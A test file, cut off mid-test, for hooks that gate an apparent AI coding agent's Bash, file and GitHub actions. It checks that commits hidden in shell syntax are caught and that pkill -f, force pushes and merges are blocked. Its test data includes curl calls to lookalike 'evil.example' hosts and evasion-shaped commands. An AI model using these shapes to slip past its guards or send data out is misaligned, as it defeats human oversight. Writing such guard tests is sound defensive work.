// bash-guard-hardening.test.mjs — the Bash guard fails CLOSED (ledger L12 + M36, 2026-10-09).
//
// The commit guard reads the command with .claude/hooks/shellparse.py and,
// when the parser sees no commit, used to trust it. It answered `[]` for a
// commit inside `if …; then …; fi`, `{ …; }`, a loop body, a line carrying an
// `$(( a << b ))` shift (the heredoc scanner swallowed everything after it)
// and for an unbalanced quote, so test:guards, the ratchet auto-raise and the
// unstaged-tree check were all skipped. These are RUN against the real hook
// against a project fixture with no executable git hook. The git-hook tests
// cover staged-tree classification and suite execution after the split.
//
// Run: node --test tests/unit/bash-guard-hardening.test.mjs   (npm run test:tooling-fast)
import "../helpers/git-fixture-env.mjs"; // FIRST: scrubs the GIT_DIR & co. a git hook exports (#1807)
import { test } from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath, pathToFileURL } from "node:url";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const HOOK = path.join(ROOT, ".claude/hooks/bash-guard.sh");
const PARSE = path.join(ROOT, ".claude/hooks/shellparse.py");

function scratchRepo(prefix) {
  fs.mkdirSync(path.join(ROOT, "artifacts"), { recursive: true });
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", prefix));
  const g = (...a) => spawnSync("git", a, { cwd: dir, encoding: "utf8" });
  g("init", "-q"); g("config", "user.email", "t@t"); g("config", "user.name", "t");
  fs.mkdirSync(path.join(dir, "docs"), { recursive: true });
  fs.writeFileSync(path.join(dir, "docs/PHYSICS.md"), "note\n");
  g("add", "-A"); g("commit", "-qm", "init");
  return { dir, g, rm: () => fs.rmSync(dir, { recursive: true, force: true }) };
}


// Commit recognition now guards hook reachability, not an in-PreToolUse suite.
function missingHook(repo, command) {
  fs.mkdirSync(path.join(repo.dir, ".githooks"), { recursive: true });
  fs.writeFileSync(path.join(repo.dir, ".githooks/pre-commit"), "#!/bin/sh\nexit 0\n");
  return spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo.dir }),
    cwd: repo.dir, encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: repo.dir },
  });
}
function assertCommitReachability(repo, commands, prose = []) {
  for (const command of commands) {
    const r = missingHook(repo, command);
    assert.equal(r.status, 2, command + "\n" + r.stderr);
    assert.match(r.stderr, /no pre-commit hook would run/, command);
  }
  for (const command of prose) { const r=missingHook(repo, command); assert.equal(r.status, 0, command+"\n"+r.stderr); }
}

const commitJson = (command) => spawnSync("python3", [PARSE, "commit"], { input: command, encoding: "utf8" }).stdout.trim();

// Shapes where the real commit hides behind shell syntax.
const COMPOUND = [
  "if true; then git commit -m x; fi",
  "if ! git diff --cached --quiet; then git commit -m x; else echo none; fi",
  "{ git commit -m x; }",
  "for i in 1 2; do git commit -m x; done",
  "while true; do git commit -m x; break; done",
  "! git commit -m x",
  "( git commit -m x )",
  "echo $((1 << n))\ngit commit -m x",
  "git \\\n commit -m x",
  "x=`git commit -m x`",
  'eval "git commit -m x"',
];
// Text the parser cannot tokenise at all: the regex fallback must catch them.
const UNPARSEABLE = ['git commit -m "unbalanced', "git commit -m 'it's broken'"];

test("shellparse reports the commit inside every compound-command shape (L12)", () => {
  for (const cmd of COMPOUND) {
    const out = commitJson(cmd);
    assert.notEqual(out, "[]", `shellparse missed the commit in: ${JSON.stringify(cmd)}`);
    assert.equal(JSON.parse(out).length, 1, cmd);
  }
});

test("shellparse says `null` (not `[]`) for text it cannot tokenise, and `[]` for non-commits", () => {
  for (const cmd of UNPARSEABLE) assert.equal(commitJson(cmd), "null", cmd);
  for (const cmd of ["echo 'git commit -m x'", "git log --oneline", "cat <<EOF\nif x; then git commit; fi\nEOF", "read x <<< hi\ngit status"])
    assert.equal(commitJson(cmd), "[]", cmd);
  // a heredoc with its closing line still hides its body; a `<<` with no closing line hides nothing
  assert.equal(commitJson("cat <<EOF\ngit commit -m inside\nEOF\ngit commit -m real").match(/"all"/g).length, 1);
});

test("the guard SEES commits behind compound and unparseable syntax, and ignores prose", () => {
  const repo = scratchRepo("hook-compound-");
  try { assertCommitReachability(repo, ["git commit -m x", ...COMPOUND, ...UNPARSEABLE],
    ["echo 'if x; then git commit; fi'", "git log --oneline", "git commit --dry-run -m x",
     "cat <<EOF\nif x; then git commit; fi\nEOF", "APEX_SKIP_GUARDS=1 git commit -m x", "git status && echo done"]);
  } finally { repo.rm(); }
});
test("the pkill guard blocks -f however the flags are spelled (M36)", () => {
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command } }),
    encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: ROOT },
  });
  for (const cmd of [
    "pkill -9f node", "pkill -u root -f chrome", "pkill --signal 9 -f chrome", "pkill -KILL -f node",
    "pkill -fl chrome", "pkill chrome -f", "pkill -x -9 --full playwright", "sudo pkill -9f chrome",
    "kill -9 $(pgrep -u root -f chrome)", "pgrep -9f chrome | xargs kill",
  ]) assert.equal(run(cmd).status, 2, `bash-guard must block: ${cmd}`);
  for (const cmd of ["pkill -x firefox", "pkill -u root sleep", "echo 'pkill -9f node'", "pgrep -u root bash"])
    assert.equal(run(cmd).status, 0, `bash-guard must allow: ${cmd}`);
});

test("settings.json no longer sets APEX_MERGE_DESK for everyone, and the gate receipts decide merges and ready flips (2026-10-19)", () => {
  const settings = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8"));
  // 2026-10-26 system audit §10: the shared env made every worker a desk; the orchestrator's environment sets it now.
  assert.equal(Object.hasOwn(settings.env || {}, "APEX_MERGE_DESK"), false, "APEX_MERGE_DESK is not in the shared env");
  settings.env = { ...settings.env, APEX_MERGE_DESK: "1" };   // the receipts decide even for a desk session
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", "hook-receipt-"));
  let gh = {};
  const run = (tool_name, tool_input) => spawnSync("bash", [path.join(ROOT, ".claude/hooks/github-mcp-guard.sh")], {
    input: JSON.stringify({ tool_name, tool_input }), encoding: "utf8",
    env: { ...process.env, APEX_MERGE_DESK: settings.env.APEX_MERGE_DESK, CLAUDE_PROJECT_DIR: dir, ...gh },
  }).stdout.trim();
  try {
    const head = "c".repeat(40);
    gh = fakeGh(dir, { head });
    denies(run("mcp__github__merge_pull_request", { pullNumber: 1, merge_method: "merge", expectedHeadSha: head }), /No session merges or arms/, "no merge, desk or not");
    denies(run("mcp__github__update_pull_request", { pullNumber: 1, draft: false }), /ready-gate\.mjs --pr 1/, "no receipt, no ready flip");
    writeGateReceipt(dir, "merge", 1, head);
    writeGateReceipt(dir, "ready", 1, head);
    // WP-L4 (2026-10-27): a merge receipt opens nothing any more — merge-gate writes none, so only a hand-written one existed.
    for (const name of ["mcp__github__merge_pull_request", "mcp__github__enable_pr_auto_merge"])
      denies(run(name, { pullNumber: 1, merge_method: "merge", mergeMethod: "MERGE", expectedHeadSha: head }), /shut for every session/, `${name} with a receipt`);
    assert.equal(run("mcp__github__update_pull_request", { pullNumber: 1, draft: false }), "", "a gated draft→ready on the gated live head passes silently");
    gh = fakeGh(dir, { head: "d".repeat(40) });
    denies(run("mcp__github__update_pull_request", { pullNumber: 1, draft: false }), /the PR head dddddddddddd is not the gated head/, "the head moved after the gate");
    gh = fakeGh(dir, { head: null });
    denies(run("mcp__github__update_pull_request", { pullNumber: 1, draft: false }), /live head is unknown/, "an unreadable live head refuses");
    for (const m of ["squash", "rebase"])
      denies(run("mcp__github__merge_pull_request", { pullNumber: 1, merge_method: m, expectedHeadSha: head }), /MERGE-COMMIT-ONLY/, `${m} stays denied`);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

const GATE_FILES = ["tools/ci/merge-gate.mjs", "tools/ci/ready-gate.mjs", "tools/lib/gate-receipt.mjs"];
const sha256 = (f) => crypto.createHash("sha256").update(fs.readFileSync(f)).digest("hex");

/** `root` holds a COMMITTED copy of the gate files (git init when needed), as merge_policy.gate_files_check demands
 *  (2026-10-26: a receipt counts only when the gate that wrote it is the committed one). Returns their sha256s. */
function gateFixture(root) {
  const g = (...a) => spawnSync("git", ["-C", root, ...a], { encoding: "utf8" });
  if (!fs.existsSync(path.join(root, ".git"))) { g("init", "-q"); g("config", "user.email", "t@t"); g("config", "user.name", "t"); }
  const hashes = {};
  for (const f of GATE_FILES) {
    const to = path.join(root, f);
    if (!fs.existsSync(to)) { fs.mkdirSync(path.dirname(to), { recursive: true }); fs.copyFileSync(path.join(ROOT, f), to); }
    hashes[f] = sha256(to);
  }
  if (g("ls-files", "--error-unmatch", "--", ...GATE_FILES).status !== 0) {
    g("add", "--", ...GATE_FILES);
    g("commit", "-qm", "gate files", "--only", "--", ...GATE_FILES);
  }
  return hashes;
}

/** `out` (a PreToolUse hook's stdout) denies, and its reason matches `re` (WP-L4 door behaviour, not a source pin). */
function denies(out, re, msg) {
  const h = JSON.parse(String(out).trim().split("\n").pop()).hookSpecificOutput;
  assert.equal(h.permissionDecision, "deny", msg);
  assert.match(h.permissionDecisionReason, re, msg);
}

/** A fake `gh` first on PATH (WP-L4: the ready doors read the PR's live head, the hold door its live labels):
 *  `gh api …/pulls/<n> --jq .head.sha` prints `head`, `gh api …/issues/<n>` prints `labels` one per line; a null
 *  answer exits 1 (the API is unreachable). Returns the env to pass to the hook. */
function fakeGh(root, { head = null, labels = null } = {}) {
  const bin = path.join(root, ".fakebin");
  fs.mkdirSync(bin, { recursive: true });
  const q = (s) => `'${String(s).replace(/'/g, "")}'`;
  const lab = labels == null ? "exit 1" : labels.length ? `printf '%s\\n' ${labels.map(q).join(" ")}` : "true";
  fs.writeFileSync(path.join(bin, "gh"), `#!/bin/sh\ncase "$*" in\n  *pulls/*) ${head ? `echo ${q(head)}` : "exit 1"} ;;\n  *issues/*) ${lab} ;;\n  *) exit 1 ;;\nesac\n`, { mode: 0o755 });
  return { PATH: `${bin}${path.delimiter}${process.env.PATH}` };
}

/** A fresh gate receipt (tools/lib/gate-receipt.mjs shape) under <root>/artifacts/<kind>-gate/<pr>.json. */
function writeGateReceipt(root, kind, pr, head, extra = {}) {
  const gateFiles = gateFixture(root);
  const dir = path.join(root, "artifacts", `${kind}-gate`);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, `${pr}.json`), JSON.stringify({ kind, pr, head, ok: true, at: new Date().toISOString(), gateRoot: root, gateFiles, ...extra }));
}

test("settings.json registers bash-guard once, without unsupported per-step filters", () => {
  const settings = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8"));
  const hooks = settings.hooks.PreToolUse
    .filter((group) => group.matcher === "Bash")
    .flatMap((group) => group.hooks)
    .filter((entry) => entry.command.includes("bash-guard.sh"));
  assert.equal(hooks.length, 1, "one Bash call must start one imported Claude bash-guard");
  assert.equal(Object.hasOwn(hooks[0], "if"), false, "Cursor does not document Claude hook-step `if` filters");
  assert.equal(hooks[0].timeout, 30);
  assert.equal(hooks[0].onFailure, "block");
});

test("bash-guard fast-exits non-trigger commands (trigger union pinned)", () => {
  const src = fs.readFileSync(HOOK, "utf8");
  const trigger = src.match(/^GUARD_TRIGGER='([^']+)'$/m);
  assert.ok(trigger, "bash-guard declares its fast-path trigger union");
  const words = /^\\b\((.+)\)\\b$/.exec(trigger[1]);
  assert.ok(words, "whole words: \\b(a|b|…)\\b (2026-10-26: the substring union matched .claude/skills, digit, evaluate)");
  for (const w of ["git", "gh", "kill", "pkill", "pgrep", "curl", "wget", "node", "npm", "npx", "playwright", "chrome", "chromium",
    "python", "python3", "sh", "bash", "eval", "xargs", "sleep", "agent-run", "test-bg", "verify-change"])
    assert.ok(words[1].split("|").includes(w), `the fast path covers ${w}`);
  const r = spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command: "echo ordinary-command" } }),
    encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: ROOT },
  });
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.stdout, "");
});

test("pkill -f blocks whatever its pattern names: it always matches its own shell (#2125)", () => {
  // `pkill -f "serve -l 3456"` passed the old browser-word filter and killed its
  // own shell (exit 144) in two census siblings on 2026-10-15.
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command } }),
    encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: ROOT },
  });
  for (const cmd of [
    'pkill -f "serve -l 3456"', "pkill -f serve ; sleep 1", "pkill -f 'http.server'",
    "pkill -f zzz-census-nonexistent-pattern", "timeout 5 pkill --full apex-tools-mcp",
  ]) assert.equal(run(cmd).status, 2, `bash-guard must block: ${cmd}`);
  // killall matches process names, not command lines: unrelated names stay allowed
  for (const cmd of ["killall sleep", "pkill -x serve", 'echo "pkill -f serve"'])
    assert.equal(run(cmd).status, 0, `bash-guard must allow: ${cmd}`);
});

test("settings.json denies a force push or a deploy-branch push however it is spelled (M36)", () => {
  const deny = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8")).permissions.deny
    .filter((d) => d.startsWith("Bash(git push")).map((d) => d.slice("Bash(".length, -1));
  // a permission pattern is a glob: `*` is any run of characters
  const matches = (pat, cmd) => new RegExp("^" + pat.split("*").map((s) => s.replace(/[.+?^${}()|[\]\\]/g, "\\$&")).join(".*") + "$").test(cmd);
  const denied = (cmd) => deny.some((p) => matches(p, cmd));
  for (const cmd of [
    "git push --force", "git push --force-with-lease origin x", "git push -f origin x",
    "git push origin x --force", "git push origin x --force-with-lease", "git push origin x -f",
    "git push origin +HEAD:cursor/topic", "git push origin +cursor/topic",
    "git push origin claude/f1-game-project-26h3ng", "git push origin HEAD:claude/f1-game-project-26h3ng",
    "git push origin HEAD:refs/heads/claude/f1-game-project-26h3ng",
  ]) assert.ok(denied(cmd), `settings.json must deny: ${cmd}`);
  for (const cmd of ["git push -u origin cursor/ci-adapted-guard-88f2", "git push origin HEAD:cursor/topic-1234", "git push"])
    assert.ok(!denied(cmd), `settings.json must allow: ${cmd}`);
});

test("the SCAN heredoc scanner does not swallow the line after `<<<` or an arithmetic shift (M36 pkill)", () => {
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command } }),
    encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: ROOT },
  });
  assert.equal(run("read x <<< hi\npkill -f chrome").status, 2);
  assert.equal(run("echo $((1 << n))\npkill -f chrome").status, 2);
  assert.equal(run("cat <<EOF\npkill -f chrome\nEOF").status, 0, "a real heredoc body is still prose");
});

// 15-F6 / 15-F7 (2026-10-10): the two shapes #1288 left open.
const SHELL_HEREDOCS = [
  "bash <<EOF\ngit commit -am x\nEOF",
  "bash <<'EOF'\ngit add -A && git commit -m \"x\"\nEOF",
  "sh <<EOF\ngit commit -m x\nEOF",
  "cat <<EOF | bash\ngit commit -m x\nEOF",
  "sudo bash -s <<'EOF'\nset -e\ngit commit -m x\nEOF",
];

test("shellparse reads a commit inside a heredoc a shell runs; a plain heredoc stays prose (15-F6)", () => {
  for (const cmd of SHELL_HEREDOCS) {
    const out = commitJson(cmd);
    assert.notEqual(out, "[]", `shellparse missed the commit in: ${JSON.stringify(cmd)}`);
    assert.equal(JSON.parse(out).length, 1, cmd);
  }
  assert.equal(commitJson("cat <<EOF\ngit commit -m x\nEOF"), "[]");
  assert.equal(commitJson("python3 - <<EOF\nprint('git commit')\nEOF"), "[]");
  // the real commit's own message heredoc is still prose, and the commit is still seen once
  assert.equal(JSON.parse(commitJson("git commit -F - <<EOF\nthe message\nEOF")).length, 1);
});

test("the guard SEES a commit in shell heredocs, including unparseable text (15-F6)", () => {
  const repo = scratchRepo("hook-heredoc-");
  try { assertCommitReachability(repo, [...SHELL_HEREDOCS, "bash <<'EOF'\ngit commit -m \"unbalanced\nEOF"],
    ["cat <<EOF\ngit commit -m x\nEOF", "python3 - <<EOF\nprint('git commit -m x')\nEOF"]);
  } finally { repo.rm(); }
});
test("commit hook reachability follows the target worktree (15-F6)", () => {
  const target = scratchRepo("hook-target-"), home = scratchRepo("hook-home-");
  try {
    missingHook(target, "git status");
    const run = command => spawnSync("bash", [HOOK], { input: JSON.stringify({tool_name:"Bash",tool_input:{command}}),
      cwd:home.dir, encoding:"utf8", env:{...process.env,CLAUDE_PROJECT_DIR:home.dir} });
    for (const command of [`cd ${target.dir} && git commit -m x`, `git -C ${target.dir} commit -m x`,
      `cd ${path.dirname(target.dir)} && git -C ${path.basename(target.dir)} commit -m x`]) {
      const r=run(command); assert.equal(r.status,2,r.stderr); assert.match(r.stderr,/no pre-commit hook/);
    }
    assert.equal(run("git commit -m x").status,0,"a non-project scratch repo stays outside the project hook rule");
  } finally { target.rm(); home.rm(); }
});
test("the pkill guard sees through timeout / xargs / setsid wrappers (15-F7)", () => {
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command } }),
    encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: ROOT },
  });
  for (const cmd of [
    "timeout 5 pkill -f chrome", "timeout -k 2 10s pkill -9f node", "echo chrome | xargs pkill -f", "xargs -n 1 pkill -f playwright < pids",
    "setsid pkill -f chrome", "sudo timeout 5 pkill -f node", "timeout 5 killall chrome",
  ]) assert.equal(run(cmd).status, 2, `bash-guard must block: ${cmd}`);
  for (const cmd of ["timeout 5 sleep 1", "echo a | xargs echo", "timeout 5 pkill -x firefox", "echo 'timeout 5 pkill -f chrome'"])
    assert.equal(run(cmd).status, 0, `bash-guard must allow: ${cmd}`);
});

test("settings.json auto-approves curl only to a loopback PORT, never a lookalike host (15-F8, Bryce 2026-10-10)", () => {
  const allow = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8")).permissions.allow
    .filter((d) => d.startsWith("Bash(curl")).map((d) => d.slice("Bash(".length, -1));
  const matches = (pat, cmd) => new RegExp("^" + pat.split("*").map((s) => s.replace(/[.+?^${}()|[\]\\]/g, "\\$&")).join(".*") + "$").test(cmd);
  const allowed = (cmd) => allow.some((p) => matches(p, cmd));
  for (const cmd of ["curl http://127.0.0.1:3456/version.json", "curl http://localhost:3713/health"])
    assert.ok(allowed(cmd), `settings.json must allow: ${cmd}`);
  for (const cmd of ["curl http://127.0.0.1.evil.example/?d=x", "curl http://127.0.0.1@evil.example/", "curl http://localhost.evil.example/"])
    assert.ok(!allowed(cmd), `settings.json must NOT auto-approve: ${cmd}`);
});

// R4-SUPPLY-4 (2026-10-10): allow-listed "read" commands that WRITE a named file.
// Each is auto-approved by settings.json (git checkout/restore/diff, sed -n, curl
// to loopback), so the edit guard was the only check, and shellparse saw none.
const READ_SHAPED_WRITES = [
  "git checkout HEAD~5 -- js/roster.js", "git checkout -- js/roster.js", "git checkout HEAD js/roster.js",
  "git checkout js/roster.js", "git -C js checkout -- roster.js",
  "git restore --source=HEAD~5 js/roster.js", "git restore js/roster.js", "git restore -s HEAD~1 js/roster.js",
  "git restore --staged --worktree js/roster.js",
  "sed -n 'w js/roster.js' AGENTS.md", "sed -e 's/a/b/w js/roster.js' AGENTS.md", "sed -ne '1p' -e '/a/W js/roster.js' AGENTS.md",
  "git diff --output=js/roster.js HEAD~1", "git log -p --output js/roster.js", "git show --output=js/roster.js HEAD",
  "curl -so js/roster.js http://127.0.0.1:3456/x", "curl --output js/roster.js http://127.0.0.1:3456/x",
  "curl -o js/roster.js http://127.0.0.1:3456/x", "curl -sSLojs/roster.js http://127.0.0.1:3456/x",
  "curl --output-dir js -o roster.js http://127.0.0.1:3456/x",
];
const READ_SHAPED_READS = [
  "git checkout main", "git checkout -b feat origin/main", "git checkout cursor/topic-1234", "git restore --staged js/roster.js",
  "git diff", "git diff HEAD~1 --stat -- js/roster.js", "git show HEAD:js/roster.js", "git log --oneline -- js/roster.js",
  "sed -n '1,20p' js/roster.js", "sed -n '/w x/p;$p' js/roster.js", "sed 's/w/W/g' js/roster.js", "sed -n 'l;w /dev/stdout' js/roster.js",
  "curl http://127.0.0.1:3456/x", "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:3456/x", "curl -H 'X: -o js/roster.js' http://127.0.0.1:3456/x",
];

test("the edit guard blocks a generated file written by git checkout/restore/--output, sed w, curl -o (R4-SUPPLY-4)", () => {
  const repo = scratchRepo("hook-readwrite-");
  const run = (command) => spawnSync("bash", [path.join(ROOT, ".claude/hooks/protect-files.sh")], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo.dir }),
    cwd: repo.dir, encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: repo.dir },
  });
  try {
    fs.mkdirSync(path.join(repo.dir, "js"), { recursive: true });
    fs.writeFileSync(path.join(repo.dir, "js/roster.js"), "var ApexRoster;\n");
    assert.equal(run("cp docs/PHYSICS.md js/roster.js").status, 2, "control: a cp onto the generated file is blocked");
    for (const cmd of READ_SHAPED_WRITES) {
      const r = run(cmd);
      assert.equal(r.status, 2, `must block: ${cmd} (${r.stderr})`);
      assert.match(r.stderr, /js\/roster\.js \(via Bash: (git-|sed-w|curl)/, `the refusal names the write: ${cmd}`);
    }
    for (const cmd of READ_SHAPED_READS) {
      const r = run(cmd);
      assert.equal(r.status, 0, `a read must stay open: ${cmd} (${r.stderr})`);
    }
  } finally { repo.rm(); }
});

// ── AGENT GUARDS (2026-10-14, docs/notes/AGENT-GUARDS-2026-10-14.md) ──────────
const hook = (script, payload, opts = {}) => spawnSync("bash", [path.join(ROOT, ".claude/hooks", script)], {
  input: typeof payload === "string" ? payload : JSON.stringify(payload),
  cwd: opts.cwd, encoding: "utf8",
  // NODE_TEST_CONTEXT would turn the hook's own `node --test` into a child of THIS run
  env: Object.fromEntries(Object.entries({ ...process.env, CLAUDE_PROJECT_DIR: opts.cwd || ROOT, ...(opts.env || {}) })
    .filter(([k]) => k !== "NODE_TEST_CONTEXT")),
});

test("PreToolUse guards fit the 30-second budget and block host-level failures", () => {
  const settings=JSON.parse(fs.readFileSync(path.join(ROOT,".claude/settings.json"),"utf8"));
  for(const h of settings.hooks.PreToolUse.flatMap(g=>g.hooks)) {
    assert.equal(h.onFailure,"block",h.command);
    if(h.command.includes("bash-guard.sh")) assert.ok(h.timeout<=30);
  }
});
test("a subagent cannot boot Chromium through the capture CLIs either (tools/shot, tools/ui audits, gfx-probe)", () => {
  const run = (command, sub = true) => hook("bash-guard.sh", { tool_name: "Bash", tool_input: { command }, ...(sub ? { agent_id: "a1", agent_type: "x" } : {}) });
  const browser = [
    "node tools/shot/shot.mjs monza", "node tools/shot/apex-eval.mjs monza 'a.info()'", "node tools/shot/agent.mjs monza info",
    "node ./tools/shot/flyby.mjs spa", "node /home/user/f1-game/tools/shot/hud-survey.mjs", "cd x && node tools/shot/backend-compare.mjs",
    "node tools/ui/layout-audit.mjs --screens=garage", "node tools/ui/menu-mock.mjs", "node tools/ui/css-play.mjs menus",
    "node tools/gfx/gfx-probe.mjs --backend webgpu", "node tools/shot/shot.mjs monza --helper",
  ];
  const open = [
    "node tools/shot/shot.mjs --help", "node tools/ui/layout-audit.mjs --help", "node tools/ui/css-play.mjs --plan",
    "node tools/shot/frame-report.mjs monza", "node tools/shot/cam-motion.mjs", "node tools/shot/cam-corners.mjs",
    "node tools/gfx/wgx-validate.mjs --static", "node tools/ui/menu-fit.mjs", "grep -n launch tools/shot/shot.mjs",
  ];
  for (const c of browser) assert.equal(run(c).status, 2, `a subagent must not run: ${c}`);
  for (const c of open) assert.equal(run(c).status, 0, `a subagent may run: ${c}`);
  for (const c of browser) assert.equal(run(c, false).status, 0, `the main session may run: ${c}`);
});

test("the push guard refuses force / mirror / delete / deploy-branch pushes in every shell shape", () => {
  const repo = scratchRepo("hook-push-");
  const run = (command) => hook("bash-guard.sh", { tool_name: "Bash", tool_input: { command }, cwd: repo.dir }, { cwd: repo.dir });
  try {
    repo.g("checkout", "-qb", "cursor/topic-1234");
    for (const c of [
      "git push -f origin x", "git push --force", "git push --force-with-lease origin x", "git push -uf origin x",
      "git push origin +x", "git push origin +HEAD:cursor/topic", "git push --mirror origin", "git push origin --delete x",
      "git push -d origin x", "git push origin :x", "git push --all origin",
      "git -C . push -f origin x", "git --no-pager push --force", "git -c push.default=current push -f",
      "bash -c 'git push --force'", "env X=1 git push -f", "/usr/bin/git push -f", "if true; then git push -f; fi",
      "git push origin claude/f1-game-project-26h3ng", "git push origin HEAD:claude/f1-game-project-26h3ng",
      "git push origin HEAD:refs/heads/claude/f1-game-project-26h3ng", "git push -u origin cursor/x claude/f1-game-project-26h3ng",
      'git push "unbalanced',
    ]) {
      const r = run(c);
      assert.equal(r.status, 2, `must block: ${c} (${r.stderr})`);
      assert.match(r.stderr, /BLOCKED/, c);
    }
    for (const c of ["git push", "git push -u origin cursor/topic-1234", "git push origin HEAD", "git push origin HEAD:cursor/topic-1234",
      "git push -o ci.skip origin cursor/x", "echo 'git push --force'", "git log --oneline origin/claude/f1-game-project-26h3ng",
      "git fetch origin claude/f1-game-project-26h3ng", "git commit --dry-run -m 'never git push -f'"])
      assert.equal(run(c).status, 0, `must allow: ${c} (${run(c).stderr})`);
    // ON the deploy branch, a bare or HEAD push targets it.
    repo.g("checkout", "-qb", "claude/f1-game-project-26h3ng");
    for (const c of ["git push", "git push origin", "git push origin HEAD", "git -C . push -u origin HEAD"])
      assert.equal(run(c).status, 2, `on the deploy branch, must block: ${c}`);
    assert.equal(run("git push origin HEAD:cursor/topic-1234").status, 0, "an explicit topic destination is fine from any branch");
  } finally { repo.rm(); }
});

test("protect-files scopes track-surveyor writes to circuit pairs, scratch/ and artifacts/", () => {
  const repo = scratchRepo("hook-surveyor-");
  const run = (payload) => hook("protect-files.sh", { cwd: repo.dir, ...payload }, { cwd: repo.dir });
  const write = (rel, agent_type) => run({ tool_name: "Write", tool_input: { file_path: path.join(repo.dir, rel), content: "x" },
    ...(agent_type ? { agent_id: "a1", agent_type } : {}) });
  try {
    for (const rel of ["js/circuits/monza.js", "js/circuits/scenery/monza.js", "js/circuits/scenery/spa.js", "scratch/survey/a.md", "artifacts/x.json"])
      assert.equal(write(rel, "track-surveyor").status, 0, `surveyor may write ${rel}`);
    for (const rel of ["js/track/core/def.js", ["js", "game"].join("/") + ".js", "tests/data/landmarks/monza.json", "docs/PHYSICS.md", ["js/circuits/scenery", "sub", "x.js"].join("/"), "AGENTS.md"]) {
      const r = write(rel, "track-surveyor");
      assert.equal(r.status, 2, `surveyor must not write ${rel}`);
      assert.match(r.stderr, /track-surveyor writes only/);
    }
    assert.equal(write("js/track/core/def.js", "worker").status, 0, "the scope is the surveyor's alone");
    // pass 4 (2026-10-26): the eight reporter agents are sandboxed to scratch/ and artifacts/ too.
    const ro = write("js/track/core/def.js", "verify-agent");
    assert.deepEqual([ro.status, ro.stderr.includes("read-only reporter")], [2, true], "a reporter agent never writes the tree");
    assert.equal(write("js/track/core/def.js").status, 0, "the main session is unaffected");
    const bash = (command) => run({ tool_name: "Bash", tool_input: { command }, agent_id: "a1", agent_type: "track-surveyor" });
    assert.equal(bash("sed -i s/a/b/ js/track/core/def.js").status, 2);
    assert.equal(bash("echo x > js/circuits/scenery/monza.js").status, 0);
  } finally { repo.rm(); }
});

test("protect-files scopes agent-surface-reviewer to its scratch/**.md report and refuses its Bash writes", () => {
  const repo = scratchRepo("hook-reporter-");
  const who = { agent_id: "r1", agent_type: "agent-surface-reviewer" };
  const run = (payload) => hook("protect-files.sh", { cwd: repo.dir, ...payload, ...who }, { cwd: repo.dir });
  const write = (rel) => run({ tool_name: "Write", tool_input: { file_path: path.join(repo.dir, rel), content: "x" } });
  try {
    assert.equal(write("scratch/survey/x.md").status, 0, "the reviewer may write its report");
    for (const rel of [".claude/skills/x/SKILL.md", "scratch/survey/x.json", "AGENTS.md", "artifacts/x.md"]) {
      const r = write(rel);
      assert.equal(r.status, 2, `reviewer must not write ${rel}`);
      assert.match(r.stderr, /agent-surface-reviewer writes only/);
    }
    const bash = (command) => run({ tool_name: "Bash", tool_input: { command } });
    const game = ["js", "game"].join("/") + ".js";
    for (const c of [`sed -i s/a/b/ ${game}`, "echo x > scratch/survey/x.md", "rm scratch/old.md", "git stash"])
      assert.equal(bash(c).status, 2, `reviewer Bash must not write: ${c}`);
    for (const c of ["git log -n 5", "wc -l AGENTS.md"]) assert.equal(bash(c).status, 0, `reviewer may read: ${c}`);
  } finally { repo.rm(); }
});

test("file and browser guards refuse unreadable input (fail closed)", () => {
  for(const name of ["protect-files.sh","mcp-browser-guard.sh"]){
    const r=hook(name,"not json"); assert.equal(r.status,2,r.stderr); assert.match(r.stderr,/BLOCKED/);
  }
});
test("github-mcp-guard: merge commits only, merge/arm denied outright, a live-head receipt before the draft→ready flip, passes other PR edits", () => {
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", "hook-gate-"));
  const head = "e".repeat(40);
  const gh = fakeGh(dir, { head });
  const run = (tool_name, tool_input = {}, env = { APEX_MERGE_DESK: "" }) => hook("github-mcp-guard.sh", { tool_name, tool_input }, { env: { ...gh, ...env }, cwd: dir });
  const decision = (r) => { assert.equal(r.status, 0, r.stderr); return r.stdout.trim() ? JSON.parse(r.stdout).hookSpecificOutput : null; };
  try {
    for (const [name, input] of [["mcp__github__enable_pr_auto_merge", { pullNumber: 1, mergeMethod: "SQUASH" }],
      ["mcp__github__merge_pull_request", { pullNumber: 1, merge_method: "squash" }], ["mcp__github__merge_pull_request", { pullNumber: 1, merge_method: "rebase" }]]) {
      for (const env of [{ APEX_MERGE_DESK: "" }, { APEX_MERGE_DESK: "1" }]) {
        const d = decision(run(name, input, env));
